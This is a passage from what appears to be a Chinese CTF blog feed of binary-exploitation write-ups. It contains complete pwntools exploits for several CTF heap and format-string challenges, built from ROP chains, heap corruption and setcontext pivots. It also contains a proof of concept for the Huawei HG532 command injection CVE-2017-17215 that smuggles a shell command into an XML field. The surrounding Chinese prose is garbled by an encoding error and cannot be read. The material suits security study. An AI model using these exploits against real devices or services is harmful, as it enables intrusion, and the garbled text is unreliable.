class="hljs-number">0xf0</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>debut(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x240</span>)<br>retire(<span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    rename(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">2</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x320</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>rename(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">1</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x340</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x240</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x221</span>)  + p64(heap_addr + <span class="hljs-number">0x570</span>) + p64(malloc_hook - <span class="hljs-number">0x38</span>)<br>rename(<span class="hljs-number">2</span>, payload)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x210</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(libcbase + <span class="hljs-number">0x99540</span>)<br>backdoor(payload)<br><br>payload = flat(<br>    p64(pop_rdi), p64(heap_addr + <span class="hljs-number">0x580</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(heap_addr),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">0</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(heap_addr),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">1</span>),<br>    p64(syscall_ret)<br>)<br>payload = payload.ljust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>debut(<span class="hljs-number">1</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹</p><h3 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman_2019_format"></a>xman_2019_format</h3><p>ç¨‹åºå­˜åœ¨å¤šä¸ªå‡½æ•°åµŒå¥—ï¼Œè€Œebpä¸­ä¿å­˜ä¸Šä¸€ä¸ªå‡½æ•°æ ˆçš„å€¼ï¼Œåˆ©ç”¨ebpçš„æ•°æ®ä¿®æ”¹ä¸€å®šçš„åç§»ï¼Œå°†å…¶æŒ‡å‘è¿”å›åœ°å€ï¼Œæœ€åä¿®æ”¹è¿”å›åœ°å€</p><p>â€‹</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;xman_2019_format&#x27;</span>)<br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>num1 = <span class="hljs-number">0x38</span><br>num2 = <span class="hljs-number">0x39</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    payload = <span class="hljs-string">b&#x27;%10$p|&#x27;</span><br>    payload += <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num1 + <span class="hljs-number">4</span>).encode() + <span class="hljs-string">b&#x27;c%10$hhn|%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0xab</span>).encode() + <span class="hljs-string">b&#x27;c%18$hhn|%&#x27;</span> <br>    payload += <span class="hljs-built_in">str</span>(num2 + <span class="hljs-number">4</span>).encode() + <span class="hljs-string">b&#x27;c%10$hhn|%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x85</span>).encode() + <span class="hljs-string">b&#x27;c%18$hhn&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    p.send(payload)<br>    p.recvuntil(<span class="hljs-string">b&#x27;58&#x27;</span>, timeout=<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./xman_2019_format&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27991</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç®€å•å¤ç°CVE-2017-17215</title>
    <link href="/2023/01/01/CVE-2017-17215/"/>
    <url>/2023/01/01/CVE-2017-17215/</url>
    
    <content type="html"><![CDATA[<p>â€‹</p><p>ç”±äºä¸æƒ³é‡æ–°å†å¼€ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œè¿™é‡Œå°±ç›´æ¥ä½¿ç”¨<a href="https://github.com/VulnTotal-Team/IoT-vulhub">IoT-vulhub</a>è¿™ä¸ªé¡¹ç›®æ¥é…ç½®çš„ç¯å¢ƒã€‚</p><p>CVE-2017-17215åœ¨é¡¹ç›®ä¸­åªèƒ½ä¾èµ–äºqemu-systemå¯åŠ¨ï¼Œéœ€è¦æˆ‘ä»¬äº‹å…ˆæ„å»ºå¥½ç›¸åº”qemu-systemçš„dockeré•œåƒã€‚åä¸º HG532è·¯ç”±å™¨çš„å›ºä»¶æ˜¯mipså¤§ç«¯æ¶æ„ï¼Œæ‰€ä»¥å…ˆè¿›å…¥åˆ°<code>/baseImage/qemu-system/mips/images</code>ä¸‹è½½å¥½ç›¸åº”çš„qemuå¯åŠ¨é•œåƒï¼Œå†å»æ„å»º<code>qemu-system:mips</code>çš„dockeré•œåƒ</p><img src="/img/9/Screenshot_20230108_021304.png" style="zoom: 80%;" /><p>æœ€åæŒ‰ç…§é¡¹ç›®çš„<a href="https://github.com/VulnTotal-Team/IoT-vulhub/tree/master/HUAWEI/CVE-2017-17215">æ•™ç¨‹</a>æ¥å°±å¯ä»¥æ­£å¸¸è¿è¡Œå¯åŠ¨ç¯å¢ƒäº†ã€‚</p><p>â€‹</p><p>è¿™é‡Œæ˜¯åœ¨dockerä¸­å†å»è¿è¡Œqemu-systemï¼Œqemu-systemä¸­çš„ipåœ¨æœ¬æœºä¸Šæ˜¯æ— æ³•ç›´æ¥è®¿é—®çš„ï¼Œåœ¨ä½¿ç”¨sshé€šè¿‡2345ç«¯å£è½¬å‘åï¼Œå¦‚æœæƒ³ä½¿ç”¨æœ¬æœºçš„æµè§ˆå™¨å»è®¿é—®è·¯ç”±ç™»å½•ç•Œé¢ä¹Ÿéœ€è¦è®¾ç½®ç›¸åº”çš„ä»£ç†</p><img src="/img/9/Screenshot_20230108_022129.png" style="zoom: 50%;" /><p>ä½¿ç”¨firefoxç›´æ¥å»è®¿é—®<code>http://192.168.2.2/</code>å¯èƒ½æŠ¥é”™ï¼Œéœ€è¦åœ¨<code>about:config</code>ä¸­å»æ›´æ”¹security.tls.version.fallback-limitå’Œsecurity.tls.version.min</p><img src="/img/9/Screenshot_20230108_024054.png"  /><p>æ›´æ”¹åå°±å¯ä»¥æ­£å¸¸è®¿é—®<code>http://192.168.2.2/</code>è·¯ç”±ç™»å½•ç•Œé¢äº†</p><p>â€‹</p><p>pocå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br>headers = &#123;<br>    <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br>&#125;<br> <br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="hljs-string"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="hljs-string">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="hljs-string">   &lt;NewStatusURL&gt;;/bin/busybox ls;&lt;/NewStatusURL&gt;</span><br><span class="hljs-string">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span><br><span class="hljs-string">  &lt;/u:Upgrade&gt;</span><br><span class="hljs-string"> &lt;/s:Body&gt;</span><br><span class="hljs-string">&lt;/s:Envelope&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>response = requests.post(<span class="hljs-string">&#x27;http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1&#x27;</span>,headers=headers,data=data)<br></code></pre></td></tr></table></figure><p>â€‹</p><p>è¿è¡Œå¦‚ä¸‹ï¼š</p><img src="/img/9/Screenshot_20230108_043234.jpg"  /><p>åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥è¿›å…¥dockerä¸­ä½¿ç”¨tcdumpå»æŠ“å–æµé‡ï¼Œç„¶åå¤åˆ¶åˆ°æœ¬æœºä¸­ç”¨Wiresharkå…·ä½“åˆ†æï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">tcpdump -i tap0 -w result.cap<br><br>docker cp <span class="hljs-number">74</span>d6970b35fb:<span class="hljs-regexp">/root/</span>result.cap <span class="hljs-regexp">/home/</span>kali/Desktop<br></code></pre></td></tr></table></figure><p>â€‹</p><p>è¿™ä¸ªå‘½ä»¤æ³¨å…¥çš„å®ç°æ˜¯åœ¨&#x2F;bin&#x2F;upnpè¿™ä¸ªæ–‡ä»¶ä¸­çš„sub_40749cå‡½æ•°å¼•å‘çš„ï¼Œé€šè¿‡å¯¹NewStatusURLå’ŒNewDownloadURLå­—ç¬¦ä¸²çš„äº¤å‰å¼•ç”¨ï¼Œå¾ˆå®¹æ˜“åœ¨binaryninjaå‘ç°è¯¥å‡½æ•°</p><p><img src="/img/9/Screenshot_20230108_044959.png"></p><p>â€‹</p><p>å‚è€ƒï¼š</p><p><a href="https://www.iotsec-zone.com/article?id=187#%E8%AE%BE%E5%A4%87%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90">åä¸ºHG532 - CVE-2017-17215æ¼æ´ç®€æ- IOTsec-Zoneç‰©è”ç½‘å®‰å…¨ç¤¾åŒº</a></p><p>[<a href="https://bbs.kanxue.com/thread-274713.htm">åŸåˆ›]åä¸ºHG532è·¯ç”±å™¨å‘½ä»¤æ³¨å…¥æ¼æ´åˆ†æ(CVE-2017-17215)-æ™ºèƒ½è®¾å¤‡-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buuå¯’å‡ç»ƒä¹ 1</title>
    <link href="/2022/12/30/buu1/"/>
    <url>/2022/12/30/buu1/</url>
    
    <content type="html"><![CDATA[<h3 id="ycb-2020-easy-heap"><a href="#ycb-2020-easy-heap" class="headerlink" title="ycb_2020_easy_heap"></a>ycb_2020_easy_heap</h3><p>ç¨‹åºåœ¨ä½¿ç”¨editåŠŸèƒ½æ—¶å‡ºç°äº†<code>&#39;\x00&#39;</code>å­—èŠ‚æº¢å‡ºï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„prev_size ã€size å’Œ PREV_INUSEæ ‡å¿—ä½ï¼Œè®©å…¶ä¸ä¸Šè¾¹çš„unsorted chunkåˆå¹¶é€ æˆå †å—é‡å </p><img src="/img/8/Screenshot_20230101_012711.png" style="zoom: 80%;" /><p>â€‹</p><p>ç„¶è€Œè¿™é‡Œæ˜¯libc-2.30.soï¼Œä¼šå¯¹åˆå¹¶çš„ä¸Šä¸€ä¸ªchunkçš„sizeæ£€æŸ¥ï¼Œä¸ä¿®æ”¹çš„prev_sizeå¯¹æ¯”ï¼Œè¿™æ ·ä»¥å‰çš„æ–¹æ³•å°±ä¸èƒ½ç»§ç»­ä½¿ç”¨äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//_int_freeä¸­çš„æ£€æŸ¥ç‰‡æ®µ</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>      unlink_chunk (av, p);<br>    &#125;      <br></code></pre></td></tr></table></figure><p>è¿™ç§é«˜ç‰ˆæœ¬çš„off-by-oneæ€»ç»“å¦‚ä¸‹ï¼š</p><ol><li>è®©åˆå¹¶çš„chunkçš„sizeä¸ä¼ªé€ çš„prev_sizeç›¸ç­‰ï¼Œæ‰èƒ½é€šè¿‡æ£€æŸ¥ï¼Œä½†ä¿®æ”¹æ­£å¸¸chunkçš„sizeæ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥åœ¨chunkä¸­å»ä¼ªé€ å¦ä¸€ä¸ªchunkå³å¯ï¼›</li><li>ç”±äºå †å—çš„åˆå¹¶è¿˜è¦é€šè¿‡unlinkçš„æ£€æŸ¥ï¼Œmain_arenaå’Œbssä¸­ä¸€èˆ¬å¹¶ä¸å­˜åœ¨æˆ‘ä»¬ä¼ªé€ chunkçš„åœ°å€ï¼ˆå½“ç„¶æœ‰PIEä¿æŠ¤ä¹Ÿå°±ä¸ç”¨è€ƒè™‘bssï¼‰ï¼Œæ‰€ä»¥éœ€è¦å…ˆå»æ³„æ¼å †åœ°å€ï¼Œæˆ‘ä»¬è‡ªå·±åœ¨å †ä¸Šå†™å…¥ä¼ªé€ chunkçš„åœ°å€ï¼›</li><li>ä¸ä»¥å‰unlinkæ”»å‡»çš„æ€è·¯ä¸€æ ·ï¼Œä¼ªé€ chunkçš„fdå’Œbkä¹Ÿæ˜¯éœ€è¦ä¸æˆ‘ä»¬å†™å…¥çš„åœ°å€ç›¸å¯¹åº”çš„ã€‚</li></ol><p>å…·ä½“æ„é€ å¦‚ä¸‹ï¼š</p><img src="/img/8/Screenshot_20230101_022934.png" style="zoom: 67%;" /><p>â€‹                                                 </p><p>ç¨‹åºå¼€äº†æ²™ç›’ï¼Œåœ¨<code>__free_hook</code>ä¸­å†™å…¥rdiä¸rdxè½¬åŒ–çš„gedgetï¼Œå†ä¸<code>setcontext</code>å‡½æ•°ç›¸ç»“åˆåŠ«æŒrspåˆ°å †ä¸Šï¼Œæœ€åç›´æ¥ROPæˆ–è€…ä½¿ç”¨mprotectåå†™å…¥shellcode</p><p>â€‹                                                                                        </p><p>å®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;easy_heap&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./easy_heap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27074</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x420</span>)<span class="hljs-comment">#æœ¬æ¥æ˜¯æƒ³é€šè¿‡large chunkä¸€æ¬¡æ€§æ³„æ¼libcåœ°å€å’Œå †åœ°å€, ä½†editä¼šå¼•å…¥&#x27;\x00&#x27;ï¼Œæœ€åæ”¹ä¸ºtcacheæ³„æ¼å †åœ°å€</span><br>add(<span class="hljs-number">0x130</span>)<br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">1104</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x18</span>)<br>show(<span class="hljs-number">1</span>)<span class="hljs-comment">#é‡æ–°ç”³è¯·åtcacheæŒ‡é’ˆä¾ç„¶æ®‹ç•™ï¼Œè¿›è€Œæ³„æ¼å †åœ°å€</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x6c0</span><br><br>add(<span class="hljs-number">0x110</span>)<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">3</span>, payload1)<br>payload2 = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x131</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, payload2)<span class="hljs-comment">#ä¼ªé€ å †å—</span><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x130</span>)<br>edit(<span class="hljs-number">1</span>, payload3)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0xf0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>    delete(i)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>magic_gadget = libcbase + <span class="hljs-number">0x154b90</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26bb2</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2709c</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c421</span><br>ret = libcbase + <span class="hljs-number">0x256b9</span><br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>edit(<span class="hljs-number">1</span>, p64(free_hook))<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">5</span>, p64(magic_gadget))<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x6e0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x6e0</span> + <span class="hljs-number">0x100</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p64(mprotect)<br>payload += p64(heap_addr + <span class="hljs-number">0x6e0</span> + <span class="hljs-number">0x150</span>)<br>payload = payload.ljust(<span class="hljs-number">0x150</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br>edit(<span class="hljs-number">0</span>, payload)<br>delete(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                                                 </p><p>â€‹                                                                                        </p><h3 id="VNCTF2021-hh"><a href="#VNCTF2021-hh" class="headerlink" title="VNCTF2021 hh"></a>VNCTF2021 hh</h3><p>vmpwnç±»å‹çš„é¢˜ï¼ŒæŒ‡ä»¤å’Œæ“ä½œæ•°éƒ½æ˜¯4ä¸ªå­—èŠ‚ï¼Œä¸»è¦ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤ï¼š</p><img src="/img/8/Screenshot_20230101_041533.png" style="zoom:67%;" /><p>â€‹</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li>v32å­˜åœ¨äºæ ˆä¸Šï¼Œæ‰§è¡ŒæŒ‡ä»¤<code>0xb  n</code>æ—¶ä¼šé€ æˆæ•°ç»„è¶Šç•Œï¼Œå¯ä»¥å°†æ ˆä¸Šå…¶å®ƒçš„å†…å®¹å†™å…¥v32æ•°ç»„ï¼Œå†é…åˆæŒ‡ä»¤<code>0xe</code>å°±å¯ä»¥æ³„æ¼æ ˆåœ°å€å’Œ<code>__libc_start_main</code>åœ°å€ï¼›</li><li>æŒ‡ä»¤<code>0x9  n</code>å¯ä»¥åœ¨v32æ•°ç»„ä¸Šå†™å…¥ä»»ä½•æ•°ï¼Œå†é…åˆæŒ‡ä»¤<code>0xd  n</code>ï¼ŒåŒæ ·æ˜¯æ•°ç»„è¶Šç•Œå°†v32æ•°ç»„çš„å†…å®¹å†™å…¥åˆ°æ ˆä¸Šå…¶å®ƒåœ°æ–¹ï¼Œå½“ç„¶è¿™é‡Œç›´æ¥å†™å…¥å‡½æ•°è¿”å›åœ°å€ï¼Œæ‰§è¡ŒROPã€‚</li></ol><p>â€‹                                                            </p><p>å®Œæ•´expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 